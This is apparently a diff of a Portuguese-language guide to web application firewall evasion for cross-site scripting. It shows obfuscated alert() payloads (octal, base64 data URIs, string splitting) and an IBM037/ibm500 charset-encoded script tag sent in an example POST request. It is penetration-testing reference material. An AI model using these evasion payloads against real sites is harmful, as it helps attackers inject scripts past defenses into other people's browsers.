@@ -55,7 +55,7 @@ java%0ascript:alert(1) #usando caracteres de nova linha codificados
    - Codificação Base64 do JavaScript
    - Codificação HTML
 
-   Essas técnicas podem ajudar a contornar a detecção do WAF.
+   Essas técnicas podem ajudar a contornar a detecção do WAF. Exemplos abaixo:
 ```
 Function( "ale" + "rt(1)" )(); #usando funções incomuns além de alert, console.log e prompt
 javascript:74163166147401571561541571411447514115414516216450615176 #codificação octal
@@ -76,23 +76,26 @@ data:text/html; base64 ,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 codificando o javas
 
 4. **Tamanho do conteúdo**: Alguns WAFs baseados em nuvem podem não verificar uma solicitação se o tamanho do conteúdo exceder um limite específico. Nesses casos, é possível contornar o firewall aumentando o tamanho do corpo da solicitação ou da URL.
 
-4. **Conjunto de caracteres**: A técnica de Conjunto de Caracteres envolve a modificação do cabeçalho Content-Type para usar um conjunto de caracteres diferente, como por exemplo "ibm500". Um WAF que não está configurado para detectar cargas maliciosas em diferentes codificações pode não reconhecer a solicitação como maliciosa. A codificação do conjunto de caracteres pode ser feita em Python da seguinte maneira:
+5. **Conjunto de caracteres**: Essa técnica envolve a modificação do cabeçalho Content-Type para usar um conjunto de caracteres diferente, como por exemplo "ibm500". Um WAF que não está configurado para detectar cargas maliciosas em diferentes codificações pode não reconhecer a solicitação como maliciosa. A codificação do conjunto de caracteres pode ser feita em Python da seguinte maneira:
 
-```python
-import urllib.parse
-s = '<script>alert("xss")</script>'
-urllib.parse.quote_plus(s.encode("IBM037"))
+```
+$ python3
+-- snip --
+>>> import urllib.parse
+>>> s = '<script>alert("xss")</script>'
+>>> urllib.parse.quote_plus(s.encode("IBM037"))
+'L%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n'
 ```
 
 A string codificada pode então ser enviada no corpo da solicitação e carregada no servidor, como exemplificado abaixo:
 
 ```
-POST /comentário/post HTTP/1.1
+POST /comment/post HTTP/1.1
 Host: chatapp
 Content-Type: application/x-www-form-urlencoded; charset=ibm500
 Content-Length: 74
 
-%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3n
+%A2%83%99%89%97%A3n%81%93%85%99%A3M%7F%A7%A2%A2%7F%5DLa%A2%83%99%89%97%A3
 ```
 
 Essa técnica permite que a solicitação seja processada pelo servidor, contornando as verificações do WAF que não estão configuradas para detectar essa codificação específica.
